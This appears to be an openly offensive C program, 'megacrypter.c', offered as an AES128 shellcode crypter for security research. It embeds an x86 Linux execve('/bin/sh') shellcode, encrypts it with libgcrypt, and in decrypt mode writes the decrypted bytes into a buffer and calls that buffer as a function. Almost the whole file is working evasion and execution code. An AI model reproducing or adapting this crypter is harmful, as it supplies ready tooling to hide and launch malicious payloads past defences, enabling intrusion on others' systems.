// AES128 shellcode crypter
// Filename: megacrypter.c
// Author: Oleg Boytsev
// License http://creativecommons.org/licenses/by-sa/3.0/
// Legitimate use and research only
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

#define ENCR 0			//1  - when encrypt //0 when decrypt
const char *key = "mysecret";	//Set password
uint8_t iniVector[16] = {0x05};	//Set the initialization vector

static void myCrypt(int, size_t, uint8_t *);
uint8_t origShellCode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
#if !ENCR
uint8_t encrShellCode[] = "\xcd\xa4\xf1\x17\xd0\x0a\xcf\x89\x57\xb7\x60\xea\xcd\x74\xbe\xeb\x47\x7a\xdb\x18\xb0\x00\x3d\xc9\x14";
#endif

int main(){

    int i, ag = gcry_cipher_map_name("aes128");
    size_t len = strlen(origShellCode);
    uint8_t *buff = malloc(len);

    myCrypt(ag, len, buff);
#if ENCR
        for(i=0; i<len; i++){
            printf("\\x%02x", buff[i]);
        }
        printf("\n");
#else
        int (*ret)() = (int(*)())buff;
	printf("Running shellcode...\n");
        ret();
#endif

    free(buff);
    return 0;
}

static void myCrypt(int algo, size_t len, uint8_t *buff){

	gcry_cipher_hd_t hd;
	gcry_cipher_open(&hd, algo, GCRY_CIPHER_MODE_OFB, 0);
	gcry_cipher_setkey(hd, key, 16);
	gcry_cipher_setiv(hd, iniVector, 16);

#if ENCR
	gcry_cipher_encrypt(hd, buff, len, origShellCode, len);
#else
	gcry_cipher_decrypt(hd, buff, len, encrShellCode, len);
#endif
	gcry_cipher_close(hd);
}
